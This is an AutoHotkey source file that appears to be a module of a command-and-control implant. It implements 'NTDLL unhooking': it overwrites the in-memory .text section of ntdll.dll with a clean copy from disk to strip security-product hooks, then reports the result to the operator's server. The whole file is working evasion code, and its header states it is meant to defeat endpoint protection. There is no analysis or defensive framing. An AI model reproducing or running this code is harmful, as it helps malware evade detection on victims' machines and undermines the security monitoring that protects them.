; ============================================================================
; UNHOOK NTDLL MODULE
; ============================================================================
; Restores clean NTDLL from disk to evade API hooking by security products
; ============================================================================

; UnhookNTDLL - Entry point called by ExecuteModule dispatcher
UnhookNTDLL() {
    this.Log("Starting NTDLL unhook operation...")

    try {
        result := this._PerformNTDLLUnhook()

        if (result) {
            output := "NTDLL unhook completed successfully"
            this.Log(output)
        } else {
            output := "NTDLL unhook failed - check logs for details"
            this.Log(output)
        }

        message := Format("command_output|{}|{}", this.agentID, output)
        this.SendMsg(this.serverIP, this.serverPort, message)
        return result

    } catch as err {
        output := Format("NTDLL unhook error: {}", err.Message)
        this.Log(output)
        message := Format("command_output|{}|{}", this.agentID, output)
        this.SendMsg(this.serverIP, this.serverPort, message)
        return false
    }
}

; _PerformNTDLLUnhook - Core unhooking logic
_PerformNTDLLUnhook() {
    this.Log("Starting NTDLL unhooking process...")

    ; Get NTDLL base address
    ntdllBase := DllCall("GetModuleHandle", "Str", "ntdll.dll", "Ptr")
    if (!ntdllBase) {
        this.Log("Failed to get NTDLL base address")
        return false
    }
    this.Log(Format("NTDLL Base Address: 0x{:016X}", ntdllBase))

    ; Flush instruction cache before starting
    DllCall("FlushInstructionCache", "Ptr", -1, "Ptr", 0, "UInt", 0)

    ; Open clean NTDLL from disk
    ntdllPath := A_WinDir . "\System32\ntdll.dll"
    this.Log("Opening clean NTDLL from: " . ntdllPath)

    hFile := DllCall("CreateFileW",
        "Str", ntdllPath,
        "UInt", 0x80000000,  ; GENERIC_READ
        "UInt", 3,           ; FILE_SHARE_READ | FILE_SHARE_WRITE
        "Ptr", 0,
        "UInt", 3,           ; OPEN_EXISTING
        "UInt", 0x80,        ; FILE_ATTRIBUTE_NORMAL
        "Ptr", 0,
        "Ptr")

    if (hFile = -1 || !hFile) {
        this.Log(Format("Failed to open NTDLL file - Error: 0x{:X}", A_LastError))
        return false
    }
    this.Log("Successfully opened NTDLL file")

    ; Create file mapping
    hMapping := DllCall("CreateFileMapping",
        "Ptr", hFile,
        "Ptr", 0,
        "UInt", 0x02,        ; PAGE_READONLY
        "UInt", 0,
        "UInt", 0,
        "Ptr", 0,
        "Ptr")

    if (!hMapping) {
        DllCall("CloseHandle", "Ptr", hFile)
        this.Log("Failed to create file mapping")
        return false
    }
    this.Log("Successfully created file mapping")

    ; Map view of file
    mappedView := DllCall("MapViewOfFile",
        "Ptr", hMapping,
        "UInt", 0x4,         ; FILE_MAP_READ
        "UInt", 0,
        "UInt", 0,
        "UInt", 0,
        "Ptr")

    if (!mappedView) {
        DllCall("CloseHandle", "Ptr", hMapping)
        DllCall("CloseHandle", "Ptr", hFile)
        this.Log("Failed to map view of file")
        return false
    }
    this.Log("Successfully mapped view of file")

    ; Process PE headers and restore .text section
    success := false
    try {
        success := this._RestoreTextSection(ntdllBase, mappedView)
    } catch as err {
        this.Log(Format("Error restoring .text section: {}", err.Message))
    }

    ; Cleanup
    DllCall("UnmapViewOfFile", "Ptr", mappedView)
    DllCall("CloseHandle", "Ptr", hMapping)
    DllCall("CloseHandle", "Ptr", hFile)

    ; Final instruction cache flush
    DllCall("FlushInstructionCache", "Ptr", -1, "Ptr", 0, "UInt", 0)

    this.Log("NTDLL unhooking process completed")
    return success
}

; _RestoreTextSection - Find and restore the .text section
_RestoreTextSection(baseAddr, mappedView) {
    ; Read DOS header to get PE header offset
    e_lfanew := NumGet(baseAddr + 0x3C, "UInt")
    this.Log(Format("PE Header offset: 0x{:X}", e_lfanew))

    ; Get number of sections
    numberOfSections := NumGet(baseAddr + e_lfanew + 0x6, "UShort")
    this.Log(Format("Number of sections: {}", numberOfSections))

    ; Get size of optional header
    sizeOfOptionalHeader := NumGet(baseAddr + e_lfanew + 0x14, "UShort")

    ; Calculate section headers offset
    sectionHeadersOffset := e_lfanew + 0x18 + sizeOfOptionalHeader

    ; Process each section looking for .text
    loop numberOfSections {
        sectionHeader := baseAddr + sectionHeadersOffset + ((A_Index - 1) * 0x28)

        ; Read section name
        sectionName := ""
        loop 8 {
            char := Chr(NumGet(sectionHeader + A_Index - 1, "UChar"))
            if (Ord(char) = 0)
                break
            sectionName .= char
        }

        if (sectionName = ".text") {
            ; Get section info
            virtualAddress := NumGet(sectionHeader + 0x0C, "UInt")
            virtualSize := NumGet(sectionHeader + 0x08, "UInt")
            rawAddress := NumGet(sectionHeader + 0x14, "UInt")
            rawSize := NumGet(sectionHeader + 0x10, "UInt")

            this.Log(Format("Found .text section - VA: 0x{:X}, Size: 0x{:X}", virtualAddress, virtualSize))

            targetAddr := baseAddr + virtualAddress
            sourceAddr := mappedView + rawAddress

            ; Change memory protection to RWX
            oldProtect := 0
            if (!DllCall("VirtualProtect",
                "Ptr", targetAddr,
                "UInt", virtualSize,
                "UInt", 0x40,  ; PAGE_EXECUTE_READWRITE
                "UInt*", &oldProtect)) {
                this.Log("Failed to change memory protection")
                return false
            }
            this.Log(Format("Changed protection - old: 0x{:X}", oldProtect))

            ; Copy clean bytes in chunks
            try {
                chunkSize := 4096
                totalSize := Min(virtualSize, rawSize)

                loop Floor(totalSize / chunkSize) {
                    offset := (A_Index - 1) * chunkSize
                    DllCall("RtlCopyMemory",
                        "Ptr", targetAddr + offset,
                        "Ptr", sourceAddr + offset,
                        "UInt", chunkSize)
                }

                ; Copy remaining bytes
                remainingBytes := Mod(totalSize, chunkSize)
                if (remainingBytes > 0) {
                    offset := totalSize - remainingBytes
                    DllCall("RtlCopyMemory",
                        "Ptr", targetAddr + offset,
                        "Ptr", sourceAddr + offset,
                        "UInt", remainingBytes)
                }

                this.Log(Format("Copied {} bytes to .text section", totalSize))

            } catch as err {
                this.Log(Format("Error during memory copy: {}", err.Message))
                ; Restore protection before returning
                DllCall("VirtualProtect", "Ptr", targetAddr, "UInt", virtualSize, "UInt", oldProtect, "UInt*", &oldProtect)
                return false
            }

            ; Restore original protection
            DllCall("VirtualProtect",
                "Ptr", targetAddr,
                "UInt", virtualSize,
                "UInt", oldProtect,
                "UInt*", &oldProtect)

            ; Flush instruction cache
            DllCall("FlushInstructionCache", "Ptr", -1, "Ptr", 0, "UInt", 0)

            this.Log("Successfully restored .text section")
            return true
        }
    }

    this.Log(".text section not found")
    return false
}
